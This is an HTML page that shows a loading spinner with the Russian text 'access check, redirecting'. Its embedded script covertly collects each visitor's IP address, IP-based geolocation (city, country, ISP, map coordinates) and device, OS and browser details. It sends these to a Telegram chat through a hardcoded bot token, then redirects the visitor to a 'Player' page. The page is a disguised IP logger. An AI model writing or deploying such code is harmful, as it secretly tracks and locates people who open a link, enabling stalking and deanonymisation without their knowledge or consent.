<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Перенаправление...</title>
    <style>
        body {
            background: #0a0505;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: system-ui, -apple-system, sans-serif;
            color: white;
            text-align: center;
            margin: 0;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #ff4444;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h2>Проверка доступа</h2>
        <p>Перенаправление...</p>
    </div>

    <script>
        const BOT_TOKEN = '8741671236:AAEI3Qz08IsslzQzO1ZJwU2havW8xk2wRVM';
        const CHAT_ID = '8114251347';
        const REDIRECT_URL = 'https://otklix.github.io/Player/';
        
        // === ОПРЕДЕЛЕНИЕ УСТРОЙСТВА, ОС, БРАУЗЕРА ===
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Неизвестно';
            let os = '';
            let browser = '';
            
            // Браузер
            if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('OPR')) browser = 'Opera';
            else browser = 'Другой';
            
            // Устройство и ОС
            if (ua.includes('iPhone')) {
                device = '📱 iPhone';
                const iosMatch = ua.match(/iPhone OS ([\d_]+)/);
                if (iosMatch) os = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
                else os = 'iOS';
            }
            else if (ua.includes('iPad')) {
                device = '📱 iPad';
                os = 'iPadOS';
            }
            else if (ua.includes('Android')) {
                device = '🤖 Android';
                const androidMatch = ua.match(/Android ([\d.]+)/);
                if (androidMatch) os = `Android ${androidMatch[1]}`;
                const modelMatch = ua.match(/; ([^;]+?) (?:Build|\))/);
                if (modelMatch) device = `🤖 ${modelMatch[1]}`;
            }
            else if (ua.includes('Windows')) {
                device = '💻 Windows PC';
                const winMatch = ua.match(/Windows NT ([\d.]+)/);
                if (winMatch) os = `Windows ${winMatch[1]}`;
            }
            else if (ua.includes('Macintosh')) {
                device = '🍏 Mac';
                os = 'macOS';
            }
            
            return { device, os, browser };
        }
        
        // === ГЕОЛОКАЦИЯ ПО IP ===
        async function getGeoByIP(ip) {
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        country: data.country,
                        city: data.city,
                        region: data.regionName,
                        lat: data.lat,
                        lon: data.lon,
                        isp: data.isp,
                        mapUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
            } catch(e) {}
            return null;
        }
        
        async function sendNotification() {
            let ip = 'не определён';
            let geo = null;
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
                geo = await getGeoByIP(ip);
            } catch(e) {}
            
            const { device, os, browser } = getDeviceInfo();
            
            let message = `🔔 Новый переход\n\n`;
            message += `🌐 IP: ${ip}\n`;
            message += `📱 Устройство: ${device}\n`;
            if (os) message += `⚙️ ОС: ${os}\n`;
            message += `🧠 Браузер: ${browser}\n`;
            if (geo) {
                if (geo.city) message += `🏙️ Город: ${geo.city}\n`;
                if (geo.country) message += `🇺🇳 Страна: ${geo.country}\n`;
                if (geo.isp) message += `📡 Провайдер: ${geo.isp}\n`;
                if (geo.lat) message += `🗺️ Карта: ${geo.mapUrl}\n`;
            }
            message += `🕒 Время: ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    disable_notification: false
                })
            });
        }
        
        sendNotification().finally(() => {
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1000);
        });
    </script>
</body>
</html>
